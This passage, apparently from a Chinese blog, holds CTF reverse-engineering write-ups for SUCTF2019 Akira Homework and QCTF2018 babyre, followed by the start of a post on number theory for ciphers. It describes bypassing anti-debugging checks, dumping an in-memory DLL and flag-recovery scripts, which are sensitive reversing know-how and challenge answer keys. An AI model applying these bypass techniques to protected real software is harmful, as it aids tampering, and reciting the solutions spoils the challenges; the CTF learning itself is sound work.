<li>patch掉反调试，patch掉花指令，patch掉无用函数</li>
</ol>
<p>去除无用函数脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">start = <span class="number">0x4020b3</span></span><br><span class="line">end = <span class="number">0x402db9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(start,end):</span><br><span class="line">    <span class="keyword">if</span> Byte(i)==<span class="number">0xe8</span>:</span><br><span class="line">        addr=Dword(i+<span class="number">1</span>)+i+<span class="number">5</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;patching %x&quot;</span>%addr</span><br><span class="line">        <span class="keyword">if</span> Byte(addr)==<span class="number">0xc3</span>:</span><br><span class="line">            patch_byte(i,<span class="number">0x90</span>)</span><br><span class="line">            patch_byte(i+<span class="number">1</span>,<span class="number">0x90</span>)</span><br><span class="line">            patch_byte(i+<span class="number">2</span>,<span class="number">0x90</span>)</span><br><span class="line">            patch_byte(i+<span class="number">3</span>,<span class="number">0x90</span>)</span><br><span class="line">            patch_byte(i+<span class="number">4</span>,<span class="number">0x90</span>)</span><br></pre></td></tr></table></figure>
<p>大概是通过异常处理找到main函数，最后是异或了一组数，像是rc4加密</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name,<span class="keyword">uint8_t</span> *v,<span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;========%s=========\n&quot;</span>,name);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X,&quot;</span>,v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n=================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> target = <span class="number">0x19B66C9FEF431</span>ull;</span><br><span class="line">    <span class="keyword">uint8_t</span> flag[<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    target^=<span class="number">0xDEADBEEF</span>;</span><br><span class="line">    target^=<span class="number">0xBADBEEF</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">6</span>;i&lt;<span class="number">8</span>;i--)&#123;</span><br><span class="line">        flag[i]=target&amp;<span class="number">0x7f</span>;</span><br><span class="line">        target&gt;&gt;=<span class="number">7</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">uint8_t</span> result[] = &#123;<span class="number">0x75</span>,<span class="number">0x93</span>,<span class="number">0xAB</span>,<span class="number">0xF2</span>,<span class="number">0x1B</span>,<span class="number">0x54</span>,<span class="number">0x36</span>,<span class="number">0x83</span>,<span class="number">0xDF</span>,<span class="number">0xE8</span>,<span class="number">0x35</span>,<span class="number">0x51</span>,<span class="number">0x61</span>,<span class="number">0xB7</span>,<span class="number">0xC0</span>,<span class="number">0x1C</span>,<span class="number">0x29</span>,<span class="number">0x50</span>,<span class="number">0x9E</span>,<span class="number">0xCD</span>,<span class="number">0x38</span>,<span class="number">0x67</span>,<span class="number">0xA2</span>,<span class="number">0x11</span>,<span class="number">0x4F</span>,<span class="number">0x8A</span>,<span class="number">0xF9</span>,<span class="number">0x24</span>,<span class="number">0x61</span>,<span class="number">0xA1</span>,<span class="number">0x0C</span>,<span class="number">0x7B</span>,<span class="number">0xB6</span>,<span class="number">0xE5</span>,<span class="number">0x72</span>,<span class="number">0x82</span>&#125;;</span><br><span class="line">    <span class="keyword">uint8_t</span> xorData[<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> input[] = <span class="string">&quot;flag&#123;h1aaaaaaaaaaaaaaaaaaaaaaaaaaaa&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(input);i++)&#123;</span><br><span class="line">        xorData[i]=input[i]^result[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">uint8_t</span> f[] = &#123;<span class="number">0x75</span>,<span class="number">0x93</span>,<span class="number">0xAB</span>,<span class="number">0xF2</span>,<span class="number">0x1B</span>,<span class="number">0x54</span>,<span class="number">0x36</span>,<span class="number">0x86</span>,<span class="number">0x8D</span>,<span class="number">0xD6</span>,<span class="number">0x35</span>,<span class="number">0x5E</span>,<span class="number">0x64</span>,<span class="number">0x89</span>,<span class="number">0xD2</span>,<span class="number">0x4E</span>,<span class="number">0x7B</span>,<span class="number">0x5A</span>,<span class="number">0xA0</span>,<span class="number">0xEB</span>,<span class="number">0x0A</span>,<span class="number">0x59</span>,<span class="number">0xA5</span>,<span class="number">0x41</span>,<span class="number">0x40</span>,<span class="number">0x8F</span>,<span class="number">0xC7</span>,<span class="number">0x31</span>,<span class="number">0x68</span>,<span class="number">0xF3</span>,<span class="number">0x32</span>,<span class="number">0x77</span>,<span class="number">0xB6</span>,<span class="number">0xB5</span>,<span class="number">0x7D</span>,<span class="number">0x82</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">0x24</span>;i++)&#123;</span><br><span class="line">        f[i]^=xorData[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,f);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="rev-SUCTF2019-Akira-Homework"><a href="#rev-SUCTF2019-Akira-Homework" class="headerlink" title="[rev][SUCTF2019]Akira Homework"></a>[rev][SUCTF2019]Akira Homework</h2><p>同时看两份答案才勉强看懂</p>
<p>TLS回调在进程创建、结束，线程创建、结束偶会有回调</p>
<p>C语言中::Src代表访问名为Src的全局变量，避免和局部变量混淆</p>
<ol>
<li><p>有一段password，按照指定格式异或置换即可</p>
</li>
<li><p>从signature文件流读取文件，<br>这个写入文件流总是不成功，于是直接把冒号改成a，改成从文件读取就好了</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> 1.txt &gt;&gt; WinRev.exe:signature</span><br></pre></td></tr></table></figure>
<p>后进行md5校验</p>
</li>
<li><p>IDA Ctrl+E可以查看程序所有入口</p>
</li>
<li><p>TLS回调里面有个反调试和字符串解密</p>
</li>
<li><p>调试调着调着就退出了，猜测是主函数创建多线程搞得鬼，在副线程函数处下断调试，发现有个枚举进程名，然后进程了进程名的md5比对，调试发现如果是ida64.exe就退出</p>
<p> 我tm直接改成jmp</p>
<p> sub_14008500里面还是有反调试</p>
</li>
<li><p>反调试这里有个只执行一次的函数，还不清楚是什么</p>
</li>
<li><p>WaitForMultipleObjects是程序接收信号的位置，258代表睡眠超时信号，使用这个结合多线程可以实现基于时间的反调试</p>
</li>
<li><p>然后后面有map一个dll进内存，查看map的dll，可以看到mz文件头，就是可执行文件头，dump内存，可以通过字符串找到主函数</p>
</li>
<li><p>之后可以查看到AES加密，密钥很明显，密文在sub_14009850的Src中</p>
<p>这个是因为dump下的内存中，sub_180002880打开的是名为SharedMemory的映射，并且子线程中SharedMemory的数据很明显了</p>
</li>
</ol>
<p>唔，还是需要学习呀</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line"><span class="comment">############## 第一个密码</span></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">0</span>]</span><br><span class="line">b = [<span class="number">106</span>, <span class="number">90</span>, <span class="number">101</span>, <span class="number">107</span>, <span class="number">113</span>, <span class="number">65</span>, <span class="number">114</span>, <span class="number">104</span>, <span class="number">85</span>, <span class="number">124</span>, <span class="number">57</span>, <span class="number">103</span>, <span class="number">62</span>, <span class="number">48</span>, <span class="number">79</span>, <span class="number">125</span>, <span class="number">124</span>, <span class="number">100</span>]</span><br><span class="line">rb = [<span class="number">0</span>]*len(b)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(b)):</span><br><span class="line">    rb[<span class="number">6</span>*(i//<span class="number">6</span>)+a[i%<span class="number">6</span>]]=b[i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(rb)):</span><br><span class="line">    rb[i]^=i</span><br><span class="line">print(bytes(rb))</span><br><span class="line"></span><br><span class="line"><span class="comment">############# 第二个密码</span></span><br><span class="line">k = [<span class="number">0x67452301</span>,<span class="number">0xEFCDAB89</span>,<span class="number">0x98BADCFE</span>,<span class="number">0x10325476</span>]</span><br><span class="line">key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> k:</span><br><span class="line">    key.append(i&amp;<span class="number">0xff</span>)</span><br><span class="line">    key.append((i&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">    key.append((i&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">    key.append(i&gt;&gt;<span class="number">24</span>)</span><br><span class="line">key = bytes(key)</span><br><span class="line">c = [<span class="number">0xFC</span>,<span class="number">0xAE</span>,<span class="number">0xEB</span>,<span class="number">0x6E</span>,<span class="number">0x34</span>,<span class="number">0xB4</span>,<span class="number">0x30</span>,<span class="number">0x3E</span>,<span class="number">0x99</span>,<span class="number">0xB9</span>,<span class="number">0x12</span>,<span class="number">6</span>,<span class="number">0xBD</span>,<span class="number">0x32</span>,<span class="number">0x5F</span>,<span class="number">0x2B</span>]</span><br><span class="line">c = bytes(c)</span><br><span class="line">print(base64.b16encode(c))</span><br><span class="line"></span><br><span class="line"><span class="comment">################ 修改dump后的文件</span></span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&quot;winrev_dmp.dll&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line">data = data[<span class="number">0x1a0</span>:]</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&quot;winrev_newdump.dll&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(bytes(data))</span><br><span class="line"></span><br><span class="line"><span class="comment">################ 解密flag</span></span><br><span class="line"></span><br><span class="line">Src = [<span class="number">0</span>]*<span class="number">16</span></span><br><span class="line">Src[<span class="number">0</span>] = <span class="number">0x94</span></span><br><span class="line">Src[<span class="number">1</span>] = <span class="number">0xBF</span></span><br><span class="line">Src[<span class="number">2</span>] = <span class="number">0x7A</span></span><br><span class="line">Src[<span class="number">3</span>] = <span class="number">0xC</span></span><br><span class="line">Src[<span class="number">4</span>] = <span class="number">0xA4</span></span><br><span class="line">Src[<span class="number">5</span>] = <span class="number">0x35</span></span><br><span class="line">Src[<span class="number">6</span>] = <span class="number">0x50</span></span><br><span class="line">Src[<span class="number">7</span>] = <span class="number">0xD1</span></span><br><span class="line">Src[<span class="number">8</span>] = <span class="number">0xC2</span></span><br><span class="line">Src[<span class="number">9</span>] = <span class="number">0x15</span></span><br><span class="line">Src[<span class="number">10</span>] = <span class="number">0xEC</span></span><br><span class="line">Src[<span class="number">11</span>] = <span class="number">0xEF</span></span><br><span class="line">Src[<span class="number">12</span>] = <span class="number">0x9D</span></span><br><span class="line">Src[<span class="number">13</span>] = <span class="number">0x9A</span></span><br><span class="line">Src[<span class="number">14</span>] = <span class="number">0xAA</span></span><br><span class="line">Src[<span class="number">15</span>] = <span class="number">0x56</span></span><br><span class="line">Src = bytes(Src)</span><br><span class="line">key = <span class="string">b&#x27;Ak1i3aS3cre7K3y\x00&#x27;</span></span><br><span class="line">aes = AES.new(key=key,mode=AES.MODE_ECB)</span><br><span class="line">p = aes.decrypt(Src)</span><br><span class="line">print(p)</span><br></pre></td></tr></table></figure>
<p>参考</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6042#toc-9">https://xz.aliyun.com/t/6042#toc-9</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41252520/article/details/100738585">https://blog.csdn.net/qq_41252520/article/details/100738585</a></p>
<p><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1039478-1-1.html#28221000_akira-homework">https://www.52pojie.cn/thread-1039478-1-1.html#28221000_akira-homework</a></p>
<h2 id="rev-QCTF2018-babyre"><a href="#rev-QCTF2018-babyre" class="headerlink" title="[rev][QCTF2018]babyre"></a>[rev][QCTF2018]babyre</h2><p>有个关键函数，直接看汇编没什么头绪，看答案了</p>
<p>rust语言逆向</p>
<ol>
<li>通过IDAView可以查看函数大概流程</li>
<li>既然是处理，又不是超大函数，那基本上肯定有cmp指令，之后就会有分支，那这里就是关键点</li>
<li>然后经过三个处理函数，最后进行检测</li>
</ol>
<h3 id="第一个处理函数"><a href="#第一个处理函数" class="headerlink" title="第一个处理函数"></a>第一个处理函数</h3><p>分析出两个函数，都是获取指定偏移的地址，于是可以发现变换规律：</p>
<p>4个为一组进行移位</p>
<p>2—&gt;0 3—&gt;2 0—&gt;1 1—&gt;3</p>
<p>逆变换就是 0—&gt;2 1—&gt;0 3—&gt;1 2—&gt;3</p>
<h3 id="第二个处理函数"><a href="#第二个处理函数" class="headerlink" title="第二个处理函数"></a>第二个处理函数</h3><p>4个为一组，单个字符变换</p>
<p>3: -127 4: +7 5: +18 6: +88</p>
<h3 id="第三个处理函数"><a href="#第三个处理函数" class="headerlink" title="第三个处理函数"></a>第三个处理函数</h3><p>9: ror 2 10: ror 7 11: ror 4 12: ror 5</p>
<p>比对函数里面有一串字节序列，应该就是要比对的数据了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target=[<span class="number">0</span>]*<span class="number">32</span></span><br><span class="line">target[<span class="number">0</span>] = <span class="number">0xDA</span></span><br><span class="line">target[<span class="number">1</span>] = <span class="number">0xD8</span></span><br><span class="line">target[<span class="number">2</span>] = <span class="number">0x3D</span></span><br><span class="line">target[<span class="number">3</span>] = <span class="number">0x4C</span></span><br><span class="line">target[<span class="number">4</span>] = <span class="number">0xE3</span></span><br><span class="line">target[<span class="number">5</span>] = <span class="number">0x63</span></span><br><span class="line">target[<span class="number">6</span>] = <span class="number">0x97</span></span><br><span class="line">target[<span class="number">7</span>] = <span class="number">0x3D</span></span><br><span class="line">target[<span class="number">8</span>] = <span class="number">0xC1</span></span><br><span class="line">target[<span class="number">9</span>] = <span class="number">0x91</span></span><br><span class="line">target[<span class="number">10</span>] = <span class="number">0x97</span></span><br><span class="line">target[<span class="number">11</span>] = <span class="number">0xE</span></span><br><span class="line">target[<span class="number">12</span>] = <span class="number">0xE3</span></span><br><span class="line">target[<span class="number">13</span>] = <span class="number">0x5C</span></span><br><span class="line">target[<span class="number">14</span>] = <span class="number">0x8D</span></span><br><span class="line">target[<span class="number">15</span>] = <span class="number">0x7E</span></span><br><span class="line">target[<span class="number">16</span>] = <span class="number">0x5B</span></span><br><span class="line">target[<span class="number">17</span>] = <span class="number">0x91</span></span><br><span class="line">target[<span class="number">18</span>] = <span class="number">0x6F</span></span><br><span class="line">target[<span class="number">19</span>] = <span class="number">0xFE</span></span><br><span class="line">target[<span class="number">20</span>] = <span class="number">0xDB</span></span><br><span class="line">target[<span class="number">21</span>] = <span class="number">0xD0</span></span><br><span class="line">target[<span class="number">22</span>] = <span class="number">0x17</span></span><br><span class="line">target[<span class="number">23</span>] = <span class="number">0xFE</span></span><br><span class="line">target[<span class="number">24</span>] = <span class="number">0xD3</span></span><br><span class="line">target[<span class="number">25</span>] = <span class="number">0x21</span></span><br><span class="line">target[<span class="number">26</span>] = <span class="number">0x99</span></span><br><span class="line">target[<span class="number">27</span>] = <span class="number">0x4B</span></span><br><span class="line">target[<span class="number">28</span>] = <span class="number">0x73</span></span><br><span class="line">target[<span class="number">29</span>] = <span class="number">0xD0</span></span><br><span class="line">target[<span class="number">30</span>] = <span class="number">0xAB</span></span><br><span class="line">target[<span class="number">31</span>] = <span class="number">0xFE</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    t = target[(i*<span class="number">4</span>+<span class="number">9</span>)&amp;<span class="number">0x1f</span>]</span><br><span class="line">    target[(i*<span class="number">4</span>+<span class="number">9</span>)&amp;<span class="number">0x1f</span>]=((t&lt;&lt;<span class="number">2</span>)|(t&gt;&gt;<span class="number">6</span>))&amp;<span class="number">0xff</span></span><br><span class="line">    t=target[(i*<span class="number">4</span>+<span class="number">10</span>)&amp;<span class="number">0x1f</span>]</span><br><span class="line">    target[(i*<span class="number">4</span>+<span class="number">10</span>)&amp;<span class="number">0x1f</span>]=((t&gt;&gt;<span class="number">1</span>)|(t&lt;&lt;<span class="number">7</span>))&amp;<span class="number">0xff</span></span><br><span class="line">    t=target[(i*<span class="number">4</span>+<span class="number">11</span>)&amp;<span class="number">0x1f</span>]</span><br><span class="line">    target[(i*<span class="number">4</span>+<span class="number">11</span>)&amp;<span class="number">0x1f</span>]=((t&gt;&gt;<span class="number">4</span>)|(t&lt;&lt;<span class="number">4</span>))&amp;<span class="number">0xff</span></span><br><span class="line">    t=target[(i*<span class="number">4</span>+<span class="number">12</span>)&amp;<span class="number">0x1f</span>]</span><br><span class="line">    target[(i*<span class="number">4</span>+<span class="number">12</span>)&amp;<span class="number">0x1f</span>]=((t&gt;&gt;<span class="number">3</span>)|(t&lt;&lt;<span class="number">5</span>))&amp;<span class="number">0xff</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    t = target[(i*<span class="number">4</span>+<span class="number">3</span>)&amp;<span class="number">0x1f</span>]</span><br><span class="line">    target[(i*<span class="number">4</span>+<span class="number">3</span>)&amp;<span class="number">0x1f</span>]=(t+<span class="number">127</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    t = target[(i*<span class="number">4</span>+<span class="number">4</span>)&amp;<span class="number">0x1f</span>]</span><br><span class="line">    target[(i*<span class="number">4</span>+<span class="number">4</span>)&amp;<span class="number">0x1f</span>]=(t<span class="number">-7</span>+<span class="number">0x100</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    t = target[(i*<span class="number">4</span>+<span class="number">5</span>)&amp;<span class="number">0x1f</span>]</span><br><span class="line">    target[(i*<span class="number">4</span>+<span class="number">5</span>)&amp;<span class="number">0x1f</span>]=(t<span class="number">-18</span>+<span class="number">0x100</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    t = target[(i*<span class="number">4</span>+<span class="number">6</span>)&amp;<span class="number">0x1f</span>]</span><br><span class="line">    target[(i*<span class="number">4</span>+<span class="number">6</span>)&amp;<span class="number">0x1f</span>]=(t<span class="number">-88</span>+<span class="number">0x100</span>)&amp;<span class="number">0xff</span></span><br><span class="line">t = [<span class="number">0</span>]*<span class="number">4</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    t[<span class="number">0</span>]=target[i*<span class="number">4</span>]</span><br><span class="line">    t[<span class="number">1</span>]=target[i*<span class="number">4</span>+<span class="number">1</span>]</span><br><span class="line">    t[<span class="number">2</span>]=target[i*<span class="number">4</span>+<span class="number">2</span>]</span><br><span class="line">    t[<span class="number">3</span>]=target[i*<span class="number">4</span>+<span class="number">3</span>]</span><br><span class="line">    target[i*<span class="number">4</span>]=t[<span class="number">1</span>]</span><br><span class="line">    target[i*<span class="number">4</span>+<span class="number">1</span>]=t[<span class="number">3</span>]</span><br><span class="line">    target[i*<span class="number">4</span>+<span class="number">2</span>]=t[<span class="number">0</span>]</span><br><span class="line">    target[i*<span class="number">4</span>+<span class="number">3</span>]=t[<span class="number">2</span>]</span><br><span class="line">print(bytes(target))</span><br></pre></td></tr></table></figure>
<p>总结：</p>
<ol>
<li>一般会有cmp的地方是关键，因为要比对flag，长度等</li>
<li>程序中有一个或两个关键函数，比如本程序中的获取指定偏移处的数据</li>
<li>敢于行动</li>
</ol>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-note/rev/usual_cipher" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/10/21/note/rev/usual_cipher/" class="article-date">
  	<time datetime="2020-10-21T10:50:40.000Z" itemprop="datePublished">2020-10-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/21/note/rev/usual_cipher/">
        常见加密算法
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="相关数论基础"><a href="#相关数论基础" class="headerlink" title="相关数论基础"></a>相关数论基础</h2><h3 id="辗转相除法"><a href="#辗转相除法" class="headerlink" title="辗转相除法"></a>辗转相除法</h3><p>用于计算两个数的最大公约数，也叫欧几里得法</p>
<p>$gcd(a,b)=gcd(b,a\ mod\ b),a,b\in Z$</p>
<p>直到</p>
<p>$a\%b=0$</p>
<p>此时$b$就是最大公约数</p>
<p>证明过程待后续</p>
<p>代码实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int32_t</span> a,<span class="keyword">int32_t</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> t;</span><br><span class="line">    <span class="keyword">while</span>(b)&#123;</span><br><span class="line">        t=a%b;</span><br><span class="line">        a=b;</span><br><span class="line">        b=t;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="快速幂"><a href="#快速幂" class="headerlink" title="快速幂"></a>快速幂</h3><p>用于快速计算$a^n,n\in N,a\in Z$</p>
<script type="math/tex; mode=display">
a^n=\begin{cases}
a^{n-1}\cdot a,n\ is\ odd
\\a^{\frac{n}{2}}\cdot a^{\frac{n}{2}},n\ is\ even
\end{cases}</script><p>代码实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int32_t</span> <span class="title">qpow</span><span class="params">(<span class="keyword">int32_t</span> a,<span class="keyword">uint32_t</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> ans=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(n)&#123;</span><br><span class="line">        <span class="keyword">if</span>(n&amp;<span class="number">1</span>)&#123;</span><br><span class="line">            ans*=a;</span><br><span class="line">        &#125;</span><br><span class="line">        a*=a;</span><br><span class="line">        n&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="中国剩余定理"><a href="#中国剩余定理" class="headerlink" title="中国剩余定理"></a>中国剩余定理</h3><p>给出以下的一元线性同余方程组</p>
<script type="math/tex; mode=display">
S:\begin{cases}
x\equiv a_1(mod\ m_1)\\
x\equiv a_2(mod\ m_2)\\
\ \ \ \ \vdots\\
x\equiv a_n(mod\ m_n)
\end{cases}</script><p>中国剩余定理给出了有解的判定条件和解的具体形式</p>
<p>若$m_1,m_2,…,m_n$中任两数互质，则对任意整数$a_1,a_2,…,a_n$，方程组$S$有解，通解通过如下方式得到</p>
<ol>
<li><p>$M\prod\limits_{i=1}^{n}m_i,M_i=M/m_i,\forall i\in{1,2,…,n}$</p>
</li>
